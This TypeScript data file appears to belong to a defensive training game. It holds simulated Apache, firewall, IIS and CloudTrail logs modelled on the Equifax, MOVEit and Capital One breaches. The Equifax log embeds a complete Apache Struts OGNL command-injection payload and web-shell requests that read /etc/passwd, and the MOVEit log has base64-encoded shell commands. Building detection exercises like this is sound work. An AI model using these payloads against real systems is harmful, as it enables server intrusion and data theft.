/**
 * Log Data for Defense Toolkit
 *
 * Pre-populated log files for each defender objective across missions.
 * Includes Apache logs, IIS logs, CloudTrail logs, etc.
 */

interface LogDataSet {
  logs: string
  requiredPatterns: string[]
  description: string
}

export const LOG_DATA: Record<string, LogDataSet> = {
  // Equifax 2017 - Detect Apache Struts breach
  'equifax-2017-obj-defender-detect': {
    description: 'Apache access logs from ACIS dispute portal',
    requiredPatterns: ['ognl', 'struts', 'POST.*\\.action'],
    logs: `[2017-03-10 14:22:45] 220.181.108.83 - - GET /acis/index.jsp HTTP/1.1 200 4523
[2017-03-10 14:23:11] 220.181.108.83 - - GET /acis/dispute/form.jsp HTTP/1.1 200 8912
[2017-03-10 14:23:45] 220.181.108.83 - - POST /acis/struts2-showcase/integration/saveGangster.action HTTP/1.1 200 512
[2017-03-10 14:23:46] 220.181.108.83 - - POST /acis/upload.action HTTP/1.1 200 0
[2017-03-10 14:23:47] 220.181.108.83 - - "POST /acis/upload.action HTTP/1.1" 200 0 "Mozilla/5.0 %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
[2017-03-10 14:24:15] 220.181.108.83 - - POST /acis/upload.action HTTP/1.1 200 512
[2017-03-10 14:25:33] 220.181.108.83 - - GET /acis/assets/temp/shell.jsp?cmd=whoami HTTP/1.1 200 28
[2017-03-10 14:26:11] 220.181.108.83 - - GET /acis/assets/temp/shell.jsp?cmd=id HTTP/1.1 200 45
[2017-03-10 14:28:44] 10.50.10.15 - - GET /acis/reports/monthly.jsp HTTP/1.1 200 15234
[2017-03-10 14:30:22] 220.181.108.83 - - GET /acis/assets/temp/shell.jsp?cmd=netstat+-an HTTP/1.1 200 8472
[2017-03-10 15:15:09] 10.50.10.22 - - POST /acis/api/submit HTTP/1.1 200 234
[2017-03-10 15:22:33] 220.181.108.83 - - GET /acis/assets/temp/shell.jsp?cmd=cat+/etc/passwd HTTP/1.1 200 1893`,
  },

  // Equifax 2017 - Detect anomalous outbound traffic
  'equifax-2017-obj-defender-detection': {
    description: 'Network firewall logs showing data exfiltration',
    requiredPatterns: ['61\\.135\\.169\\.125', 'GB', 'HTTPS'],
    logs: `[2017-05-13 08:23:15] ALLOW 10.10.50.20:443 -> 61.135.169.125:443 (SSL/TLS) - 1.2 GB transferred
[2017-05-13 09:44:22] ALLOW 10.50.10.15:80 -> 52.85.123.45:80 (HTTP) - 45 MB transferred
[2017-05-14 02:18:44] ALLOW 10.10.50.20:443 -> 61.135.169.125:443 (SSL/TLS) - 890 MB transferred
[2017-05-14 08:15:33] ALLOW 10.50.10.18:443 -> 34.192.67.89:443 (HTTPS) - 12 MB transferred
[2017-05-15 03:44:22] ALLOW 10.10.50.20:443 -> 61.135.169.125:443 (SSL/TLS) - 1.8 GB transferred
[2017-05-16 01:22:11] ALLOW 10.10.50.21:3306 -> 10.10.50.20:3306 (MySQL) - 234 KB transferred
[2017-05-17 04:33:18] ALLOW 10.10.50.20:443 -> 61.135.169.125:443 (SSL/TLS) - 2.1 GB transferred
[2017-05-18 02:15:44] ALLOW 10.50.10.15:443 -> 52.85.123.45:443 (HTTPS) - 89 MB transferred
[2017-05-20 05:22:09] ALLOW 10.10.50.20:443 -> 61.135.169.125:443 (SSL/TLS) - 1.5 GB transferred
[2017-05-22 03:11:33] ALLOW 10.10.50.20:443 -> 61.135.169.125:443 (SSL/TLS) - 2.3 GB transferred
[2017-05-25 04:44:18] ALLOW 10.10.50.20:443 -> 61.135.169.125:443 (SSL/TLS) - 1.9 GB transferred
[2017-06-01 01:33:44] ALLOW 10.10.50.20:443 -> 61.135.169.125:443 (SSL/TLS) - 3.4 GB transferred`,
  },

  // MOVEit 2023 - Detect web shell activity
  'moveit-2023-obj-defender-detect': {
    description: 'IIS logs showing LEMURLOOT web shell requests',
    requiredPatterns: ['machine2\\.aspx', 'POST', 'base64'],
    logs: `2023-05-28 03:22:11 185.220.101.47 POST /machine2.aspx - 443 - 185.220.101.47 Mozilla/5.0+(X11;+Linux) 200 0 0 234
2023-05-28 03:23:12 10.50.10.25 GET /human.aspx - 443 moveit_admin 10.50.10.25 Mozilla/5.0 200 0 0 14523
2023-05-28 03:23:45 185.220.101.47 POST /machine2.aspx cmd=d2hvYW1p 443 clop 185.220.101.47 python-requests/2.28.0 200 0 0 512
2023-05-28 03:24:18 10.50.10.30 POST /api/upload - 443 user123 10.50.10.30 Mozilla/5.0 200 0 0 8912
2023-05-28 03:25:18 185.220.101.47 POST /machine2.aspx cmd=ZGlyIEM6XFxpbmV0cHVi 443 clop 185.220.101.47 python-requests/2.28.0 200 0 0 8192
2023-05-28 03:28:33 10.50.10.18 GET /files/list - 443 admin 10.50.10.18 Mozilla/5.0 200 0 0 3456
2023-05-28 04:15:33 185.220.101.47 POST /machine2.aspx cmd=c3FsY21kIC1TIC4gLVEg 443 clop 185.220.101.47 python-requests/2.28.0 200 0 0 45123
2023-05-28 04:22:44 185.220.101.47 POST /machine2.aspx cmd=bmV0IHVzZXIgY2xvcA== 443 clop 185.220.101.47 python-requests/2.28.0 200 0 0 1234
2023-05-28 05:10:22 10.50.10.12 GET /dashboard - 443 operator 10.50.10.12 Mozilla/5.0 200 0 0 18945
2023-05-28 06:33:11 185.220.101.47 POST /machine2.aspx cmd=dHlwZSBDOlxcc2VjcmV0cy50eHQ= 443 clop 185.220.101.47 python-requests/2.28.0 200 0 0 15678`,
  },

  // Capital One 2019 - Detect anomalous S3 access
  'capital-one-2019-obj-defender-detect': {
    description: 'CloudTrail logs showing unauthorized S3 API calls',
    requiredPatterns: ['ListBucket', 'GetObject', '98\\.207\\.15\\.143'],
    logs: `{"eventTime":"2019-04-21T09:15:33Z","eventName":"AssumeRole","sourceIPAddress":"98.207.15.143","userAgent":"aws-cli/1.16.102"}
{"eventTime":"2019-04-21T09:22:45Z","eventName":"ListBucket","sourceIPAddress":"98.207.15.143","requestParameters":{"bucketName":"capitalone-customer-data","prefix":"credit-applications/"}}
{"eventTime":"2019-04-21T09:23:11Z","eventName":"GetObject","sourceIPAddress":"98.207.15.143","requestParameters":{"bucketName":"capitalone-customer-data","key":"credit-applications/2019/Q1/batch-001.tar.gz"}}
{"eventTime":"2019-04-21T09:23:45Z","eventName":"GetObject","sourceIPAddress":"98.207.15.143","requestParameters":{"bucketName":"capitalone-customer-data","key":"credit-applications/2019/Q1/batch-002.tar.gz"}}
{"eventTime":"2019-04-21T09:24:18Z","eventName":"GetObject","sourceIPAddress":"98.207.15.143","requestParameters":{"bucketName":"capitalone-customer-data","key":"credit-applications/2019/Q1/batch-003.tar.gz"}}
{"eventTime":"2019-04-21T10:15:22Z","eventName":"ListBucket","sourceIPAddress":"10.0.1.25","requestParameters":{"bucketName":"capitalone-logs","prefix":"waf/"}}
{"eventTime":"2019-04-21T10:33:44Z","eventName":"GetObject","sourceIPAddress":"98.207.15.143","requestParameters":{"bucketName":"capitalone-customer-data","key":"ssn-records/2019/ssn-batch-march.csv"}}
{"eventTime":"2019-04-21T11:22:11Z","eventName":"GetObject","sourceIPAddress":"98.207.15.143","requestParameters":{"bucketName":"capitalone-customer-data","key":"bank-accounts/checking-accounts-Q1.json"}}
{"eventTime":"2019-04-21T11:45:33Z","eventName":"ListBucket","sourceIPAddress":"98.207.15.143","requestParameters":{"bucketName":"capitalone-customer-data","prefix":"customer-profiles/"}}`,
  },
}
